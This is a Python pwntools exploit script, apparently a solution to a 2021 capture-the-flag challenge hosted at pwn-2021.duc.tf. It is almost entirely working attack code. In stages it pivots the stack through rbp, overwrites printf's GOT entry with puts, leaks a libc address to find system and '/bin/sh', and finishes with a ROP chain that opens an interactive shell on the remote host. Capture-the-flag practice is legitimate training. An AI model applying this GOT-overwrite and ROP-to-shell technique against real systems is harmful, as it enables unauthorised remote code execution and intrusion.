from pwn import *
import time
#io = process("./rbp",aslr=True)
io = remote("pwn-2021.duc.tf",31910)
libc = ELF("./libc.so.6")

delay = 0.5

popRdi = p64(0x4012b3)
popRbp = p64(0x40114d)
putsPlt = p64(0x401030)
putsGot = p64(0x404018) 
ret = p64(0x401247)

printfGot = 0x404020

main = p64(0x4011d5)
mainRead = p64(0x4011fb) #call read; in main
movEdx = p64(0x4011a2)
movEax = p64(0x40110f)


print()
log.success("Starting Stage I")

#Stage 1: overwrite printf@got
#Rbp is now normal,next round rbp will be 0x3ff000
time.sleep(delay)
exploit = p64(0x3ff000) + mainRead
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-32")
log.info("Stage 1 I sent")


#Rbp is now at 0x3ff000,Buffer writing to = 0x3fefe0, Add to = 0x3fefe0 
#Setup rbp next round to be below printfgot
time.sleep(delay)
exploit = p64(printfGot + 0x20) + mainRead + main
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-32")
log.info("Stage 1 II sent")


#Rbp is now below printf@got,Buffer writing to = printf@got, Add to = 0x3fefe8 to ret to main,not mainRead 
time.sleep(delay)
exploit = putsPlt
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-20568")
log.info("Stage 1 III sent")

log.success("Stage 1 succesful")
print()
log.success("Starting Stage 2")



#Stage 2: Leak libc
#Rbp is now at 0x3feff0,Buffer writing to = 0x3fefd0, Add to: 0x3fefd0
#Setup rbp to be 0x3fffe0 next round , main is at 0x3fefe0 
time.sleep(delay)
exploit = p64(0x3fffe0) + mainRead + main
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-32") 
log.info("Stage 2 I sent")


#Rbp is now at 0x3fffe0,Buffer writing to = 0x3fffc0,  Add to = 0x3fefe0-8 
time.sleep(delay)
exploit = popRdi + putsGot + putsPlt
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-4104")  
log.info("Stage 2 II sent")

#Rbp is now at 0x3fefe0,Buffer writing to 0x3fefc0,rsp to 0x3fefc0
#Setup rbp to be 0x3ffff8 next round, main is at 0x3fefd0 
time.sleep(delay)
exploit = p64(0x3ffff8) + mainRead + main
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-32") 
log.info("Stage 2 III sent")

#Rbp is now at 0x3ffff8,Buffer writing to = 0x3fffd8,  Add to = 0x3fffc0-8
time.sleep(delay)
exploit = ret + main 
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-64") 
log.info("Stage 2 IV sent")

print()
log.success("Stage 2 successful")
print()

putsLibc = u64(io.recvuntil("Hi there")[2:-9].ljust(8,b"\x00"))
libc.address = putsLibc - libc.symbols["puts"]
system = p64(libc.symbols["system"])
binsh = p64(next(libc.search(b"/bin/sh")))
oneShot = p64(libc.address + 0xde792)

log.info("Puts Libc: " + hex(putsLibc))
log.info("Libc Base: " + hex(libc.address))

exploit = popRdi + binsh + system
io.send(exploit)
io.sendlineafter("Do you have a favourite number?","-40") 

#make function so look cleaner
io.interactive()


